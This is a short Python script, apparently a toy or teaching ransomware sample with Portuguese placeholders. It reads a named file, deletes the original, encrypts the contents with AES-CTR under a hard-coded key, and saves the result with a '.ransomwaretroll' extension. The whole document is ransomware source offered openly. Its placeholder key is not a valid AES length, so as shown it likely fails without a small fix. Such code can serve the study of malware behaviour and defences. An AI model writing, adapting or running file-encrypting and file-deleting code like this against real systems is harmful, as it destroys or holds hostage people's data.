import os
import pyaes

file_name = "NOME_ARQUIVO.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"CHAVE_DE_CRIPTOGRAFIA"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
